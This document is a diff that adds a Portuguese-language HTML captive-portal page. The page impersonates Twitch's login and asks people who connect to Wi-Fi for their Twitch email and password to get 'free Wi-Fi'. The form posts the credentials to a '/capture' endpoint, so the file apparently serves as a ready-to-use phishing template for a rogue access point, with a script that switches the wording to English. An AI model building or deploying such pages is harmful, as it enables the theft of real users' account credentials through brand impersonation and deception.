@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Twitch - Wi-Fi</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { font-size: 16px; }
+body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0E0E10; color: #EFEFF1; padding: 16px; }
+.card { background: #1F1F23; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.4); }
+.logo { text-align: center; margin-bottom: 24px; font-size: 28px; font-weight: 800; letter-spacing: -0.5px; color: #9146FF; }
+.logo-icon { font-size: 36px; display: block; margin-bottom: 4px; }
+.subtitle { text-align: center; color: #ADADB8; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
+.form-group { margin-bottom: 16px; }
+label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #EFEFF1; }
+input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #3A3A3D; border-radius: 8px; font-size: 15px; background: #0E0E10; color: #EFEFF1; outline: none; transition: border-color 0.2s; }
+input:focus { border-color: #9146FF; }
+button[type="submit"] { width: 100%; padding: 14px; background: #9146FF; color: #FFFFFF; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; }
+button:hover { opacity: 0.92; }
+.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #ADADB8; }
+input[type="hidden"] { display: none; }
+@media (max-width: 480px) { .card { padding: 24px 18px; } .logo { font-size: 24px; } }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">twitch</div>
+  <p class="subtitle">Faca login com sua conta Twitch para acessar o Wi-Fi gratuito</p>
+  <form action="/capture" method="POST" autocomplete="off">
+    <input type="hidden" name="csrf_token" value="">
+    <input type="hidden" name="portal_id" value="twitch">
+    <div class="form-group">
+      <label for="email">Usuario ou e-mail</label>
+      <input type="email" name="email" id="email" placeholder="seu@email.com" required autocomplete="off">
+    </div>
+    <div class="form-group">
+      <label for="password">Senha</label>
+      <input type="password" name="password" id="password" placeholder="Sua senha" required minlength="6" maxlength="128" autocomplete="new-password">
+    </div>
+    <button type="submit">Entrar com Twitch</button>
+  </form>
+  <p class="footer">Ao conectar, voce aceita os Termos de Servico da Twitch</p>
+</div>
+<script>
+(function(){
+  var lang = navigator.language || 'pt-BR';
+  if (lang.startsWith('en')) {
+    document.querySelector('.subtitle').textContent = 'Log in with your Twitch account to access free Wi-Fi';
+    document.querySelector('button[type=submit]').textContent = 'Log in with Twitch';
+    document.querySelector('.footer').textContent = 'By connecting, you agree to Twitch Terms of Service';
+    document.querySelector('label[for=email]').textContent = 'Username or email';
+    document.querySelector('label[for=password]').textContent = 'Password';
+  }
+})();
+</script>
+</body>
+</html>
